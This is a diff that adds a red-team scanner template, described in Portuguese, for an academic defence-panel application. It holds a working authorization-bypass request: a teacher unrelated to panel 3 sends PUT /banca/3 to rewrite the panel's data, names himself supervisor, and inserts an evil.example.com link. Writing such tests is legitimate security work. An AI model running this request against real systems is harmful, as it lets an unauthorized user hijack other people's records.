@@ -1,0 +1,20 @@
+id: rt03-hijack-banca-privada-alheia
+info:
+  name: "TEACHER sem vinculo reescreve banca PRIVADA de outro professor (banca 3 do teacher/o aluno 7) - updateBanca sem ownership"
+  author: redteam-sisdef
+  severity: high
+  description: "PUT /banca/:id tem so checkRole; updateBanca deleta usuariosBancas e recadastra orientador/aluno sem checar dono. professor tereceiro se nomeia orientador da banca privada alheia."
+  tags: redteam,authz,integrity
+http:
+  - raw:
+      - |
+        PUT /banca/3 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{TOKEN_TEACHER}}
+        Content-Type: application/json
+
+        {"tituloTrabalho":"REDFLAG-HIJACKED","palavrasChave":"redteam","resumo":"injected by red team","abstract":"injected","dataRealizacao":"2099-06-15T14:00:00.000Z","local":"https://evil.example.com/hijack","turma":"GICC0002","periodoAcademico":"2026.1","alunoId":7,"orientadorId":4,"cursoId":1,"membros":[{"id":"4"}]}
+    matchers:
+      - type: status
+        status:
+          - 200
